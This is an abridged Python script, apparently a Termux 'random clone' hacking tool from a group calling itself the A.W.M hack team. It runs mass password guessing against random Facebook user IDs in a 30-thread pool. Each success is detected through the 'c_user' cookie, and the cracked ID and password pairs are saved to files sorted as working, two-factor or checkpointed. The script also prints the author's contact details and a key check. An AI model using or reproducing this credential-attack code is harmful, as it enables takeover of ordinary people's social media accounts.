...
{BLUE}=  ====  ==      ====        =    \033[1;32m 𓆩A͏.͏W͏.͏M͏ P͏R͏O͏𓆪

{BLUE}=  ====  ==  ===  ===  =======

{BLUE}=  ====  ==  ====  ==  =======

{BLUE}=  ====  ==  ===  ===  =======      \033[1;32m 𓆩HACK𓆪

{BLUE}=        ==      ====      ===

{BLUE}=  ====  ==  ===  ===  =======

{BLUE}=  ====  ==  ====  ==  =======      \033[1;32m 𓆩TEAM𓆪
...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mÄ.̈Ẅ.̈M̈  P̈R̈Ö  T̈ËÄM̈              \033[1;31m│

\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mM̈ÏR̈ẄÄÏS̈ D̈ÄN̈ÏS̈ḦŸÄR̈             \033[1;31m     │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mMirwaiskhulmi             \033[1;31m │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+93796747343              \033[1;31m │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m1.5                     \033[1;31m   │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mANDROID AWM TECH             \033[1;31m   │

\033[1;37m╚A.W.M-FACEBOOK TERMUX  AND  HACK  ZONE{ AWM }\033[1;37m-A.W.M╝
...
def my_tool_security():
    ...
    print("\t  Facebook : Mirwais Danishyar")

    print("\t  Fb page  : ANDROID TECH AWM")

    print("\t  Github   : mirwaiskhulmi")
    ...
    if f_token in my_server:
        ...
        print(" to AWM Programmer fb page and your key")

        print(" otherwise msg on this whatsapp 0796747343 \n")
...
def xyz():
    ...
    os.system("play-audio WELCOME_TO_AWM_RANDOM_CLONE_TOOL.mp3")
    ...
    print(f"{RED}[01] {WHITE}RANDOM CLONE DALL KHOR  M1")
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100058681906345");xyz()

    elif hamii in ["4","04"]:

        os.system("xdg-open https://wa.me/+93787276801")
...
def password():
    ...
    passX = input(f" {RED}CHOOSE{mirwais2} : ")
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}DALL KHOR FUCK")
...
def free1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                os.system("play-audio AWM_OK.mp3")

                print('\r\033[1;32m[AWM-OK] '+uid+' [√] '+ps+ '')

                cek_apk(session,coki)

                open('/sdcard/AWM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio AWM_2F.mp3")

                    print('\r\033[1;34m[AWM-2F] '+uid+' [~] '+ps+' ')

                    open('/sdcard/AWM-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    ...
                    os.system("play-audio AWM_CP.mp3")

                    print(f'\r\033[1;30m[AWM-CP] '+uid+' [×] '+ps+ ' ')

                    open('/sdcard/AWM-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[AWM 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
